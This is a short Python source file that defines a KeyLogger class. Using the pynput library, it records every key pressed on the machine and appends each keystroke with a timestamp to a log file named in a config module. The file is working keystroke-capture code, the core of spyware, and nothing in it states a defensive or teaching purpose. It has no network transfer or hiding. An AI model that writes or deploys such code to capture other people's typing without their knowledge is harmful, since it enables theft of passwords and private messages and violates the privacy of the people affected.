from pynput import keyboard
from datetime import datetime
from config import LOG_FILE_PATH

class KeyLogger:
    def __init__(self, file_path=LOG_FILE_PATH):
        self.file_path = file_path

    def _write_key(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(self.file_path, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {key_str}\n")

    def start(self):
        listener = keyboard.Listener(on_press=self._write_key)
        listener.start()
        